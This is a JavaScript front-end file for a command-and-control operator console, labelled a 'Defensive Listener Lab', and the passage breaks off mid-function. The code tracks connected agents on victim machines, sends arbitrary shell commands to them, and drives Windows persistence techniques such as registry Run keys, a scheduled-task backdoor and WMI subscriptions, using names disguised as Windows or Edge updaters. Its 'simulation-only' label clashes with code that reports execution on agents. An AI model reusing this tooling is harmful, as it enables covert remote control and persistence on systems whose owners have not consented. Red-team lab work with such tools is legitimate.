const API = `${window.location.origin}/api`;
let currentAgent = null;
let cachedAgents = [];
let cachedListeners = [];
let cachedListenerProfiles = [];
let cachedAuditReports = [];
let selectedListenerId = null;
let selectedAgentId = null;
let selectedAuditReportId = null;
let selectedAuditReportDetail = null;
let activeCmdkIndex = 0;
let activeAgentQuickFilter = "all";
let activeAuditRiskFilter = "all";
let activeSessionsView = "table";
let bottomHeight = 180;
let sessionsGraphState = null;
let sessionsGraphAssets = null;
const BOTTOM_HEIGHT_KEY = "lab_bottom_height";
const SELECTED_LISTENER_KEY = "lab_selected_listener_id";
const AGENT_OFFLINE_AFTER_SECONDS = 12;
const MODELS_METHODS = ["add", "remove", "check", "list"];
const MODELS_TECHNIQUES = [
    {
        id: "reg",
        label: "reg",
        description: "Simulates persistence through Registry Run and related keys.",
        fields: [
            { id: "key", label: "Registry Key", type: "select", required: true, options: ["hkcurun", "hkcurunonce", "hklmrun", "hklmrunonce", "logonscript", "userinit", "stickynotes"] },
            { id: "value_name", label: "Value Name", type: "text", required: false, placeholder: "UpdaterService" },
            { id: "method", label: "Method", type: "select", required: true, options: MODELS_METHODS }
        ]
    },
    {
        id: "service",
        label: "service",
        description: "Simulates Windows service-based persistence creation/removal checks.",
        fields: [
            { id: "service_name", label: "Service Name", type: "text", required: false, placeholder: "WindowsUpdateSvc" },
            { id: "method", label: "Method", type: "select", required: true, options: MODELS_METHODS }
        ]
    },
    {
        id: "schtask",
        label: "schtask",
        description: "Simulates scheduled task persistence with configurable trigger frequency.",
        fields: [
            { id: "task_name", label: "Task Name", type: "text", required: false, placeholder: "OfficeTelemetryTask" },
            { id: "frequency", label: "Frequency", type: "select", required: false, options: ["", "hourly", "daily", "logon"] },
            { id: "method", label: "Method", type: "select", required: true, options: MODELS_METHODS }
        ]
    },
    {
        id: "schtaskbackdoor",
        label: "schtaskbackdoor",
        description: "Simulates backdooring an existing scheduled task action.",
        fields: [
            { id: "task_name", label: "Existing Task Name", type: "text", required: false, placeholder: "MicrosoftEdgeUpdateTaskMachineCore" },
            { id: "method", label: "Method", type: "select", required: true, options: MODELS_METHODS }
        ]
    },
    {
        id: "startupfolder",
        label: "startupfolder",
        description: "Simulates startup folder shortcut-based persistence artifacts.",
        fields: [
            { id: "file_name", label: "File Name", type: "text", required: false, placeholder: "StartupUpdate.lnk" },
            { id: "method", label: "Method", type: "select", required: true, options: MODELS_METHODS }
        ]
    },
    {
        id: "phantom",
        label: "phantom",
        description: "Phantom persistence via RegisterApplicationRestart (EWX_RESTARTAPPS). No registry, no task, no file trace. Survives reboot/shutdown/logoff.",
        fields: [
            { id: "scenario_name", label: "Scenario Name", type: "text", required: false, placeholder: "PhantomLabScenario01" },
            { id: "trigger_mode", label: "Trigger Mode", type: "select", required: false, options: ["all", "restart", "shutdown", "logoff"] },
            { id: "method", label: "Method", type: "select", required: true, options: MODELS_METHODS }
        ]
    },
    // ============================================================
    // WMI SUBSCRIPTION - AJOUT
    // ============================================================
    {
        id: "wmisubscription",
        label: "wmisubscription",
        description: "WMI Event Subscription persistence (T1546.003). Triggers on logon, startup, interval, or process creation.",
        fields: [
            { id: "subscription_name", label: "Subscription Name", type: "text", required: false, placeholder: "WmiSubscriptionLab01" },
            { id: "trigger_mode", label: "Trigger Mode", type: "select", required: false, options: ["interval", "logon", "startup", "process"] },
            { id: "method", label: "Method", type: "select", required: true, options: MODELS_METHODS }
        ]
    }
];
// ============================================================
// DÉTECTION AUTOMATIQUE DE L'IP DU SERVEUR C2
// ============================================================

let DETECTED_C2_IP = null;
let DETECTED_C2_PORT = 8000;

async function detectC2ServerIP() {
    try {
        // Essayer de récupérer l'IP depuis l'API health
        const response = await fetch(`${API}/health`);
        const data = await response.json();
        if (data.server_ip) {
            DETECTED_C2_IP = data.server_ip;
            DETECTED_C2_PORT = data.port || 8000;
            console.log(`[C2] IP détectée: ${DETECTED_C2_IP}:${DETECTED_C2_PORT}`);
            return;
        }
    } catch(e) {}
    
    // Fallback: utiliser l'IP de l'URL actuelle
    try {
        const hostname = window.location.hostname;
        if (hostname && hostname !== "localhost" && hostname !== "127.0.0.1" && !hostname.startsWith("0.0.0.0")) {
            DETECTED_C2_IP = hostname;
            DETECTED_C2_PORT = window.location.port || 8000;
            console.log(`[C2] IP depuis URL: ${DETECTED_C2_IP}:${DETECTED_C2_PORT}`);
            return;
        }
    } catch(e) {}
    
    // Dernier fallback
    DETECTED_C2_IP = "192.168.1.149";
    DETECTED_C2_PORT = 8000;
    console.log(`[C2] IP par défaut: ${DETECTED_C2_IP}:${DETECTED_C2_PORT}`);
}

// Fonction pour corriger une commande (remplacer 0.0.0.0)
function fixCommandIP(text) {
    if (!DETECTED_C2_IP) return text;
    if (!text) return text;
    return text.replace(/0\.0\.0\.0/g, DETECTED_C2_IP)
               .replace(/127\.0\.0\.1/g, DETECTED_C2_IP)
               .replace(/localhost/g, DETECTED_C2_IP);
}

// Fonction pour obtenir l'URL du serveur C2
function getC2ServerUrl() {
    return `http://${DETECTED_C2_IP || "192.168.1.149"}:${DETECTED_C2_PORT || 8000}`;
}
let selectedModelTechniqueId = MODELS_TECHNIQUES[0].id;
let agentHealthStateById = new Map();
let agentHealthStateInitialized = false;
let agentDisplayIdMap = new Map();
let nextAgentDisplayCounter = 1;
const CMDK_ACTIONS = [
    { id: "chat", label: "Switch: Lab Console", run: () => switchBottomTab("chat") },
    { id: "enumeration", label: "Switch: Enumeration Results", run: () => switchBottomTab("enumeration") },
    { id: "listeners", label: "Switch: Listener Lab", run: () => switchBottomTab("listeners") },
    { id: "models", label: "Switch: MODELS", run: () => switchBottomTab("models") },
    { id: "new-listener", label: "Listener: New", run: () => openListenerModal("create") },
    { id: "refresh", label: "Refresh all", run: () => refreshAll() }
];

document.addEventListener("DOMContentLoaded", async () => {
    await detectC2ServerIP();  // ← AJOUTER CETTE LIGNE
    
    selectedListenerId = getStoredSelectedListenerId();
    setupEvents();
    setupSortableTables();
    initBottomResizer();
    tickClock();
    setInterval(tickClock, 1000);
    refreshAll();
    setInterval(refreshAll, 3000);
    addConsoleLog("[*] Defensive Listener Lab UI started (Ctrl+K for palette)", "info");
    addConsoleLog(`[*] C2 Server IP détectée: ${DETECTED_C2_IP}:${DETECTED_C2_PORT}`, "info");
});

function setupEvents() {
    const input = document.getElementById("console-input");
    const runBtn = document.getElementById("execute-btn");
    const filter = document.getElementById("agent-filter");
    const chips = document.getElementById("agent-filter-chips");
    const modal = document.getElementById("agent-modal");
    const newListenerBtn = document.getElementById("new-listener-btn");
    const newPayloadBtn = document.getElementById("new-payload-btn");
    const listenerModal = document.getElementById("listener-modal");
    const payloadModal = document.getElementById("payload-modal");
    const tabChat = document.getElementById("tab-chat");
    const tabEnumeration = document.getElementById("tab-enumeration");
    const tabListeners = document.getElementById("tab-listeners");
    const tabModels = document.getElementById("tab-models");
    const listenerAddBtn = document.getElementById("listener-add-btn");
    const listenerRemoveBtn = document.getElementById("listener-remove-btn");
    const listenerEditBtn = document.getElementById("listener-edit-btn");
    const listenerStartBtn = document.getElementById("listener-start-btn");
    const listenerStopBtn = document.getElementById("listener-stop-btn");
    const listenerStatsBtn = document.getElementById("listener-stats-btn");
    const listenerExportBtn = document.getElementById("listener-export-btn");
    const auditRefreshBtn = document.getElementById("audit-refresh-btn");
    const auditDownloadBtn = document.getElementById("audit-download-btn");
    const auditCopyBtn = document.getElementById("audit-copy-btn");
    const auditRiskFilter = document.getElementById("audit-risk-filter");
    const cmdkInput = document.getElementById("cmdk-input");
    const payloadTargetListener = document.getElementById("payload-target-listener");
    const sessionsTabTable = document.getElementById("sessions-tab-table");
    const sessionsTabGraph = document.getElementById("sessions-tab-graph");

    if (runBtn) runBtn.addEventListener("click", executeConsoleCommand);
    if (input) input.addEventListener("keydown", (e) => {
        if (e.key === "Enter") executeConsoleCommand();
    });
    if (filter) filter.addEventListener("input", filterAgentsTable);
    if (chips) {
        chips.querySelectorAll(".agent-chip").forEach((chip) => {
            chip.addEventListener("click", () => {
                activeAgentQuickFilter = chip.dataset.filter || "all";
                chips.querySelectorAll(".agent-chip").forEach((button) => button.classList.remove("active"));
                chip.classList.add("active");
                filterAgentsTable();
            });
        });
    }

    if (newListenerBtn) newListenerBtn.addEventListener("click", () => openListenerModal("create"));
    if (newPayloadBtn) newPayloadBtn.addEventListener("click", () => openPayloadModal("create"));
    if (tabChat) tabChat.addEventListener("click", () => switchBottomTab("chat"));
    if (tabEnumeration) tabEnumeration.addEventListener("click", () => switchBottomTab("enumeration"));
    if (tabListeners) tabListeners.addEventListener("click", () => switchBottomTab("listeners"));
    if (tabModels) tabModels.addEventListener("click", () => switchBottomTab("models"));

    if (listenerAddBtn) listenerAddBtn.addEventListener("click", () => openListenerModal("create"));
    if (listenerEditBtn) listenerEditBtn.addEventListener("click", () => openListenerModal("edit"));
    if (listenerRemoveBtn) listenerRemoveBtn.addEventListener("click", removeSelectedListener);
    if (listenerStartBtn) listenerStartBtn.addEventListener("click", startSelectedListener);
    if (listenerStopBtn) listenerStopBtn.addEventListener("click", stopSelectedListener);
    if (listenerStatsBtn) listenerStatsBtn.addEventListener("click", showSelectedListenerStats);
    if (listenerExportBtn) listenerExportBtn.addEventListener("click", exportSelectedListener);
    if (auditRefreshBtn) auditRefreshBtn.addEventListener("click", loadAuditReports);
    if (auditDownloadBtn) auditDownloadBtn.addEventListener("click", downloadSelectedAuditReportJson);
    if (auditCopyBtn) auditCopyBtn.addEventListener("click", copySelectedAuditReportJson);
    if (auditRiskFilter) {
        auditRiskFilter.addEventListener("change", () => {
            activeAuditRiskFilter = String(auditRiskFilter.value || "all").toLowerCase();
            renderAuditReports();
        });
    }

    if (modal) modal.addEventListener("click", (e) => {
        if (e.target.id === "agent-modal") closeModal();
    });
    if (listenerModal) listenerModal.addEventListener("click", (e) => {
        if (e.target.id === "listener-modal") closeListenerModal();
    });
    if (payloadModal) payloadModal.addEventListener("click", (e) => {
        if (e.target.id === "payload-modal") closePayloadModal();
    });

    document.addEventListener("keydown", (e) => {
        if ((e.ctrlKey || e.metaKey) && e.key.toLowerCase() === "k") {
            e.preventDefault();
            openCmdk();
        }
        if (e.key === "Escape") {
            closeCmdk();
        }
    });
    if (cmdkInput) {
        cmdkInput.addEventListener("input", renderCmdkList);
        cmdkInput.addEventListener("keydown", onCmdkKeydown);
    }
    if (payloadTargetListener) {
        payloadTargetListener.addEventListener("change", () => syncPayloadServerIpFromSelectedListener({ force: true }));
    }
    if (sessionsTabTable) sessionsTabTable.addEventListener("click", () => switchSessionsView("table"));
    if (sessionsTabGraph) sessionsTabGraph.addEventListener("click", () => switchSessionsView("graph"));
    initModelsView();
    initSessionsGraph();
}

function initBottomResizer() {
    const app = document.querySelector(".lab-app");
    const resizer = document.getElementById("bottom-resizer");
    if (!app || !resizer) return;

    const savedHeight = parseInt(localStorage.getItem(BOTTOM_HEIGHT_KEY) || "180", 10);
    if (!Number.isNaN(savedHeight)) bottomHeight = Math.min(Math.max(savedHeight, 20), 420);
    applyBottomLayout();

    let dragging = false;
    const onMouseMove = (e) => {
        if (!dragging) return;
        const rect = app.getBoundingClientRect();
        const next = rect.bottom - e.clientY;
        bottomHeight = Math.min(Math.max(Math.round(next), 20), 420);
        applyBottomLayout();
    };
    const onMouseUp = () => {
        if (!dragging) return;
        dragging = false;
        document.body.style.cursor = "";
        localStorage.setItem(BOTTOM_HEIGHT_KEY, String(bottomHeight));
    };

    resizer.addEventListener("mousedown", (e) => {
        e.preventDefault();
        dragging = true;
        document.body.style.cursor = "row-resize";
    });
    window.addEventListener("mousemove", onMouseMove);
    window.addEventListener("mouseup", onMouseUp);
    window.addEventListener("resize", applyBottomLayout);
}

function applyBottomLayout() {
    const app = document.querySelector(".lab-app");
    if (!app) return;
    app.style.gridTemplateRows = `38px 1fr 12px ${bottomHeight}px`;
}

async function refreshAll() {
    await loadDashboardStats();
    await loadAgents();
    await loadListenerProfiles();
    await loadListeners();
    renderListenersTable();
    await loadAuditReports({ silent: true });
}

function switchBottomTab(tab) {
    const chatView = document.getElementById("chat-view");
    const enumerationView = document.getElementById("enumeration-view");
    const listenersView = document.getElementById("listeners-view");
    const modelsView = document.getElementById("models-view");
    const tabChat = document.getElementById("tab-chat");
    const tabEnumeration = document.getElementById("tab-enumeration");
    const tabListeners = document.getElementById("tab-listeners");
    const tabModels = document.getElementById("tab-models");

    // reset views
    if (chatView) chatView.classList.remove("active");
    if (enumerationView) enumerationView.classList.remove("active");
    if (listenersView) listenersView.classList.remove("active");
    if (modelsView) modelsView.classList.remove("active");
    if (tabChat) tabChat.classList.remove("active");
    if (tabEnumeration) tabEnumeration.classList.remove("active");
    if (tabListeners) tabListeners.classList.remove("active");
    if (tabModels) tabModels.classList.remove("active");

    if (tab === "listeners") {
        if (listenersView) listenersView.classList.add("active");
        if (tabListeners) tabListeners.classList.add("active");
        renderListenersTable();
        renderAuditReports();
        return;
    }

    if (tab === "enumeration") {
        if (enumerationView) enumerationView.classList.add("active");
        if (tabEnumeration) tabEnumeration.classList.add("active");
        renderAuditReports();
        renderAuditPreview();
        return;
    }
    if (tab === "models") {
        if (modelsView) modelsView.classList.add("active");
        if (tabModels) tabModels.classList.add("active");
        return;
    }

    if (chatView) chatView.classList.add("active");
    if (tabChat) tabChat.classList.add("active");
}

function initModelsView() {
    renderModelsTechniqueList();
    renderModelsForm();
    const form = document.getElementById("models-form");
    if (form) {
        form.addEventListener("submit", submitModelsSimulation);
    }
}

function getSelectedModelTechnique() {
    return MODELS_TECHNIQUES.find((technique) => technique.id === selectedModelTechniqueId) || MODELS_TECHNIQUES[0];
}

function renderModelsTechniqueList() {
    const container = document.getElementById("models-techniques-list");
    if (!container) return;
    container.innerHTML = "";
    MODELS_TECHNIQUES.forEach((technique) => {
        const button = document.createElement("button");
        button.type = "button";
        button.className = `models-technique-btn${technique.id === selectedModelTechniqueId ? " active" : ""}`;
        button.innerHTML = `
            <div class="models-technique-title">${technique.label}</div>
            <div class="models-technique-desc">${technique.description}</div>
        `;
        button.addEventListener("click", () => {
            selectedModelTechniqueId = technique.id;
            renderModelsTechniqueList();
            renderModelsForm();
        });
        container.appendChild(button);
    });
}

function createModelsFieldRow(field) {
    const row = document.createElement("div");
    row.className = "detail-row";
    const label = document.createElement("div");
    label.className = "detail-label";
    label.textContent = field.label;
    const value = document.createElement("div");
    value.className = "detail-value";
    const inputId = `models-field-${field.id}`;

    if (field.type === "select") {
        const select = document.createElement("select");
        select.id = inputId;
        select.className = "form-input";
        (field.options || []).forEach((optionValue) => {
            const option = document.createElement("option");
            option.value = optionValue;
            option.textContent = optionValue || "none";
            select.appendChild(option);
        });
        if (field.id === "method") select.value = "add";
        value.appendChild(select);
    } else if (field.type === "checkbox") {
        const checkbox = document.createElement("input");
        checkbox.type = "checkbox";
        checkbox.id = inputId;
        value.appendChild(checkbox);
    } else {
        const input = document.createElement("input");
        input.type = "text";
        input.id = inputId;
        input.className = "form-input";
        input.placeholder = field.placeholder || "";
        value.appendChild(input);
    }

    row.appendChild(label);
    row.appendChild(value);
    return row;
}

function renderModelsForm() {
    const technique = getSelectedModelTechnique();
    const description = document.getElementById("models-description");
    const fieldsContainer = document.getElementById("models-fields");
    if (!description || !fieldsContainer) return;
    description.textContent = `${technique.label}: ${technique.description}\nSimulation-only mode: no real persistence action is executed.`;
    fieldsContainer.innerHTML = "";
    technique.fields.forEach((field) => {
        fieldsContainer.appendChild(createModelsFieldRow(field));
    });
}

function collectModelsPayload() {
    const technique = getSelectedModelTechnique();
    
    // MODIFIER ICI - Utiliser l'IP détectée
    const payload = {
        technique: technique.id,
        server_url: getC2ServerUrl(),  // ← CHANGÉ
        listener_id: selectedListenerId || "",
        agent_id: selectedAgentId || "",
        fields: {}
    };
    
    technique.fields.forEach((field) => {
        const input = document.getElementById(`models-field-${field.id}`);
        if (!input) return;
        if (field.type === "checkbox") {
            payload.fields[field.id] = Boolean(input.checked);
            return;
        }
        let value = String(input.value || "").trim();
        
        // AJOUTER - Corriger les IPs dans les champs
        value = fixCommandIP(value);  // ← AJOUTÉ
        
        payload.fields[field.id] = value;
    });
    
    return payload;
}

async function submitModelsSimulation(event) {
    event.preventDefault();
    const output = document.getElementById("models-output-json");
    if (!output) return;
    const payload = collectModelsPayload();
    if (!payload.listener_id) {
        output.value = JSON.stringify({ status: "error", detail: "Select a listener before running MODELS." }, null, 2);
        addConsoleLog("[-] select a listener first", "error");
        return;
    }
    if (!payload.agent_id) {
        output.value = JSON.stringify({ status: "error", detail: "Select an agent before running MODELS." }, null, 2);
        addConsoleLog("[-] select an agent first", "error");
        return;
    }
    output.value = "Running simulation...";
    try {
        const response = await fetch(`${API}/models/simulate`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
        });
        const data = await response.json();
        output.value = JSON.stringify(data, null, 2);
        if (!response.ok) {
            addConsoleLog(`[-] models simulation failed: ${data.detail || response.statusText}`, "error");
            return;
        }
        const executed = Boolean(data.executed_on_agent);
        const suffix = executed
            ? ` and executed on ${payload.agent_id}`
            : " (validation only)";
        addConsoleLog(`[+] models simulation generated (${payload.technique})${suffix}`, "success");
    } catch (error) {
        output.value = JSON.stringify({ status: "error", detail: error.message }, null, 2);
        addConsoleLog(`[-] models simulation error: ${error.message}`, "error");
    }
}

function tickClock() {
    document.getElementById("header-time").textContent = new Date().toLocaleTimeString("en-US", { hour12: false });
}

async function loadDashboardStats() {
    try {
        const res = await fetch(`${API}/health`);
        const data = await res.json();
        const ok = data.status === "healthy" || data.status === "online" || data.status === "operational";
        const statusEl = document.getElementById("server-status");
        statusEl.className = `status-indicator ${ok ? "online" : "offline"}`;
        statusEl.textContent = ok ? "ONLINE" : "OFFLINE";
    } catch (e) {
        const statusEl = document.getElementById("server-status");
        statusEl.className = "status-indicator offline";
        statusEl.textContent = "OFFLINE";
    }
}

function addConsoleLog(message, type = "info") {
    const output = document.getElementById("console-output");
    const line = document.createElement("div");
    line.className = `console-line ${type}`;
    const normalized = String(message ?? "").replace(/\r\n/g, "\n");
    line.textContent = normalized;
    if (normalized.includes("\n")) {
        line.classList.add("multiline");
    }
    output.appendChild(line);
    output.scrollTop = output.scrollHeight;
    const lines = output.querySelectorAll(".console-line");
    if (lines.length > 600) lines[0].remove();
}


function getAgentHealthSnapshot(agent) {
    const rawStatus = String(agent?.status || "").toLowerCase();
    const lastSeenMs = Date.parse(agent?.last_seen || "");
    const stale = Number.isFinite(lastSeenMs)
        ? (Date.now() - lastSeenMs) > (AGENT_OFFLINE_AFTER_SECONDS * 1000)
        : false;

    if (rawStatus === "dead" || stale) {
        return { state: "offline", label: "offline", dotClass: "dead" };
    }
    if (rawStatus === "sleeping") {
        return { state: "sleeping", label: "sleeping", dotClass: "sleeping" };
    }
    return { state: "responsive", label: "responsive", dotClass: "alive" };
}

function trackAgentHealthTransitions(agents) {
    const nextMap = new Map();
    (agents || []).forEach((agent) => {
        if (!agent?.agent_id) return;
        nextMap.set(agent.agent_id, getAgentHealthSnapshot(agent).state);
    });

    if (agentHealthStateInitialized) {
        nextMap.forEach((currentState, agentId) => {
            const previousState = agentHealthStateById.get(agentId);
            if (!previousState || previousState === currentState) return;

            if (currentState === "offline") {
                addConsoleLog(`[!] ${agentId} appears offline (Target stopped or rebooted )`, "error");
                return;
            }

            if (previousState === "offline" && currentState === "responsive") {
                addConsoleLog(`[+] ${agentId} is back online (shell re-established)`, "success");
                return;
            }

            if (currentState === "sleeping") {
                addConsoleLog(`[*] ${agentId} is now sleeping`, "info");
            }
        });
    }

    agentHealthStateById = nextMap;
    agentHealthStateInitialized = true;
}

function getFilteredAgents() {
    const query = (document.getElementById("agent-filter")?.value || "").toLowerCase().trim();
    return cachedAgents.filter((agent) => {
        const health = getAgentHealthSnapshot(agent);
        const domain = getAgentDomain(agent);
        const text = `${agent.agent_id || ""} ${getAgentTargetIp(agent)} ${getAgentUsername(agent)} ${getAgentMachineName(agent)} ${domain} ${agent.operating_system || ""} ${health.state}`.toLowerCase();
        const matchesSearch = !query || text.includes(query);
        const matchesChip =
            activeAgentQuickFilter === "all" ||
            (activeAgentQuickFilter === "windows" && text.includes("windows")) ||
            (activeAgentQuickFilter === "linux" && text.includes("linux")) ||
            (activeAgentQuickFilter === "alive" && health.state === "responsive") ||
            (activeAgentQuickFilter === "sleeping" && health.state === "sleeping") ||
            (activeAgentQuickFilter === "offline" && health.state === "offline");
        return matchesSearch && matchesChip;
    });
}

function toast(message, type = "info") {
    const box = document.getElementById("toast-container");
    if (!box) return;
    const el = document.createElement("div");
    el.className = `toast ${type}`;
    el.textContent = message;
    box.appendChild(el);
    setTimeout(() => el.remove(), 2600);
}

function showAgentsLoadingSkeleton() {
    const tbody = document.getElementById("agents-tbody");
    if (!tbody) return;
    tbody.innerHTML = "";
    for (let i = 0; i < 6; i += 1) {
        const tr = document.createElement("tr");
        tr.className = "loading skeleton-row";
        tr.innerHTML = '<td colspan="9"><div class="skeleton-line"></div></td>';
        tbody.appendChild(tr);
    }
}

function getAgentDisplayId(agent) {
    const key = String(agent?.agent_id || "").trim();
    if (!key) return "A-0000";
    if (!agentDisplayIdMap.has(key)) {
        const id = `A-${String(nextAgentDisplayCounter).padStart(4, "0")}`;
        agentDisplayIdMap.set(key, id);
        nextAgentDisplayCounter += 1;
    }
    return agentDisplayIdMap.get(key);
}

function getAgentTargetIp(agent) {
    return agent?.ip_address ?? agent?.target_ip ?? agent?.external_ip ?? "-";
}

function getAgentUsername(agent) {
    return agent?.username ?? agent?.user ?? agent?.user_name ?? "-";
}

function getAgentMachineName(agent) {
    return agent?.hostname ?? agent?.machine_name ?? agent?.computer_name ?? "-";
}

function getAgentDomain(agent) {
    return agent?.domain ?? agent?.domain_name ?? agent?.user_domain ?? "-";
}

function showAuditLoadingSkeleton() {
    const tbody = document.getElementById("audit-reports-tbody");
    if (!tbody) return;
    tbody.innerHTML = "";
    for (let i = 0; i < 4; i += 1) {
        const tr = document.createElement("tr");
        tr.className = "loading skeleton-row";
        tr.innerHTML = '<td colspan="5"><div class="skeleton-line"></div></td>';
        tbody.appendChild(tr);
    }
}

function executeConsoleCommand() {
    const input = document.getElementById("console-input");
    const cmd = input.value.trim();
    if (!cmd) return;
    input.value = "";
    addConsoleLog(`> ${cmd}`, "info");

    const lower = cmd.toLowerCase();
    const localHandled = handleLocalConsoleCommand(lower, cmd);
    if (localHandled) return;

    if (lower.startsWith("shell ")) {
        const shellCommand = cmd.slice(6).trim();
        runAgentShellCommand(shellCommand);
        return;
    }

    // Interactive mode: any unknown command is sent to the selected agent shell.
    // Prefix "/" to force local-only commands in the future.
    runAgentShellCommand(cmd);
}

function handleLocalConsoleCommand(lowerCommand, rawCommand) {
    if (lowerCommand === "help" || lowerCommand === "/help") {
        addConsoleLog("[*] local commands: help, agents, listeners, clear, health", "info");
        addConsoleLog("[*] remote shell: type command directly (ex: whoami, dir, ipconfig)", "info");
        addConsoleLog("[*] legacy format still works: shell <cmd>", "info");
        return true;
    }

    if (lowerCommand === "agents" || lowerCommand === "/agents") {
        addConsoleLog(`[+] sessions: ${cachedAgents.length}`, "success");
        return true;
    }

    if (lowerCommand === "listeners" || lowerCommand === "/listeners") {
        addConsoleLog(`[+] listeners: ${cachedListeners.length}`, "success");
        return true;
    }

    if (lowerCommand === "health" || lowerCommand === "/health") {
        loadDashboardStats();
        addConsoleLog("[*] health refresh requested", "info");
        return true;
    }

    if (lowerCommand === "clear" || lowerCommand === "/clear") {
        document.getElementById("console-output").innerHTML = "";
        return true;
    }

    // Keep "shell" alone as a helpful hint.
    if (lowerCommand === "shell" || rawCommand === "/shell") {
        addConsoleLog("[-] usage: type command directly (interactive) or shell <command>", "error");
        return true;
    }

    return false;
}

async function runAgentShellCommand(command) {
    if (!command) {
        addConsoleLog("[-] shell usage: shell <command>", "error");
        return;
    }
    if (!selectedListenerId) {
        addConsoleLog("[-] select a listener first", "error");
        return;
    }
    if (!selectedAgentId) {
        addConsoleLog("[-] select an agent first", "error");
        return;
    }

    addConsoleLog(`[*] queue shell command to ${selectedAgentId}`, "info");
    try {
        const queueRes = await fetch(
            `${API}/listeners/${encodeURIComponent(selectedListenerId)}/agents/${encodeURIComponent(selectedAgentId)}/shell/command`,
            {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ command })
            }
        );
        const queueData = await queueRes.json();
        if (!queueRes.ok) {
            addConsoleLog(`[-] shell queue failed: ${queueData.detail || queueRes.statusText}`, "error");
            return;
        }

        const commandId = queueData.command_id;
        const shellState = await waitForShellResult(selectedListenerId, selectedAgentId, commandId, 45000, 1000);
        if (!shellState || !shellState.result) {
            if (shellState?.queued) {
                addConsoleLog("[-] command is still queued: agent is not polling shell yet (start MyAgent with --shell)", "error");
            } else {
                addConsoleLog("[-] no shell result yet (agent offline or still executing)", "error");
            }
            return;
        }

        const result = shellState.result;
        const statusPrefix = result.exit_code === 0 && !result.timed_out ? "[+]" : "[-]";
        addConsoleLog(`${statusPrefix} shell exit=${result.exit_code} timeout=${Boolean(result.timed_out)}`, result.exit_code === 0 ? "success" : "error");
        if (result.stdout) addConsoleLog(result.stdout, "info");
        if (result.stderr) addConsoleLog(result.stderr, "error");
    } catch (error) {
        addConsoleLog(`[-] shell command error: ${error.message}`, "error");
    }
}

async function waitForShellResult(listenerId, agentId, commandId, timeoutMs = 30000, pollMs = 1000) {
    const start = Date.now();
    let sawQueuedOnly = false;
    while (Date.now() - start < timeoutMs) {
        const historyRes = await fetch(
            `${API}/listeners/${encodeURIComponent(listenerId)}/agents/${encodeURIComponent(agentId)}/shell/history?limit=80`
        );
        const historyData = await historyRes.json();
        if (historyRes.ok && Array.isArray(historyData.history)) {
            const result = historyData.history.find((entry) => entry.command_id === commandId && entry.status === "completed");
            if (result) {
                return { result, queued: sawQueuedOnly };
            }

            const queued = historyData.history.find((entry) => entry.command_id === commandId && entry.status === "queued");
            if (queued) {
                sawQueuedOnly = true;
            }
        }

        await new Promise((resolve) => setTimeout(resolve, pollMs));
    }

    return { result: null, queued: sawQueuedOnly };
}

async function loadAgents() {
    try {
        showAgentsLoadingSkeleton();
        const res = await fetch(`${API}/agents/`);
        const agents = await res.json();
        cachedAgents = Array.isArray(agents) ? agents : [];

        const tbody = document.getElementById("agents-tbody");
        tbody.innerHTML = "";
        if (!cachedAgents.length) {
            tbody.innerHTML = '<tr class="loading"><td colspan="9">No simulated agents</td></tr>';
            renderSessionsGraph();
            return;
        }

        cachedAgents.forEach((agent) => {
            const tr = document.createElement("tr");
            tr.className = "agent-row";
            tr.dataset.agentId = agent.agent_id || "";
            if (selectedAgentId && agent.agent_id === selectedAgentId) {
                tr.classList.add("selected");
            }
            tr.addEventListener("click", () => {
                selectedAgentId = agent.agent_id;
                renderAgentsSelection();
                showAgentDetails(agent.agent_id);
            });
            const health = getAgentHealthSnapshot(agent);
            const osText = (agent.operating_system || "unknown").toString();
            const osLower = osText.toLowerCase();
            const osClass = osLower.includes("win") ? "os-windows" : (osLower.includes("linux") ? "os-linux" : "os-other");
            const healthText = health.label;
            const healthStateClass = health.state === "offline" ? "offline" : health.state;
            const displayId = getAgentDisplayId(agent);
            const targetIp = getAgentTargetIp(agent);
            const username = getAgentUsername(agent);
            const machineName = getAgentMachineName(agent);
            const domain = getAgentDomain(agent);
            tr.innerHTML = `
                <td>${displayId}</td>
                <td>${targetIp}</td>
                <td>${username}</td>
                <td>${machineName}</td>
                <td>${domain}</td>
                <td><span class="agent-badge ${osClass}">${osText}</span></td>
                <td>${agent.process_id ?? "-"}</td>
                <td>${formatTimeAgo(agent.last_seen)}</td>
                <td>
                    <span class="status-cell ${health.dotClass}"></span>
                    <span class="agent-health-badge ${healthStateClass}">${healthText}</span>
                </td>
            `;
            tbody.appendChild(tr);
        });
        trackAgentHealthTransitions(cachedAgents);
        filterAgentsTable();
    } catch (e) {
        addConsoleLog(`[-] agents fetch failed: ${e.message}`, "error");
        renderSessionsGraph();
    }
}

function renderAgentsSelection() {
    document.querySelectorAll(".agent-row").forEach((row) => {
        const rowAgentId = row.dataset.agentId || "";
        row.classList.toggle("selected", selectedAgentId && rowAgentId === selectedAgentId);
    });
}

function filterAgentsTable() {
    const filteredIds = new Set(getFilteredAgents().map((agent) => agent.agent_id));
    document.querySelectorAll(".agent-row").forEach((row) => {
        const rowAgentId = row.dataset.agentId || "";
        const isVisible = rowAgentId && filteredIds.has(rowAgentId);
        row.style.display = isVisible ? "" : "none";
    });
    renderSessionsGraph();
}

function formatTimeAgo(ts) {
    const t = new Date(ts || Date.now());
    const sec = Math.floor((Date.now() - t.getTime()) / 1000);
    if (Number.isNaN(sec)) return "-";
    if (sec < 60) return `${sec}s`;
    if (sec < 3600) return `${Math.floor(sec / 60)}m`;
    if (sec < 86400) return `${Math.floor(sec / 3600)}h`;
    return `${Math.floor(sec / 86400)}d`;
}

function formatDateTime(ts) {
    if (!ts) return "-";
    const value = new Date(ts);
    if (Number.isNaN(value.getTime())) return String(ts);
    return value.toLocaleString("en-US", { hour12: false });
}

function getStoredSelectedListenerId() {
    try {
        return localStorage.getItem(SELECTED_LISTENER_KEY) || null;
    } catch (e) {
        return null;
    }
}

function storeSelectedListenerId(listenerId) {
    try {
        if (listenerId) localStorage.setItem(SELECTED_LISTENER_KEY, listenerId);
        else localStorage.removeItem(SELECTED_LISTENER_KEY);
    } catch (e) {
        // ignore storage failures
    }
}

function getListenerPriority(listener) {
    const stats = listener?.stats || {};
    const agentsConnected = Number(listener?.agents_connected ?? stats.agents_connected ?? 0) || 0;
    const heartbeats = Number(stats.heartbeats_received ?? 0) || 0;
    const events = Number(stats.events_recorded ?? 0) || 0;
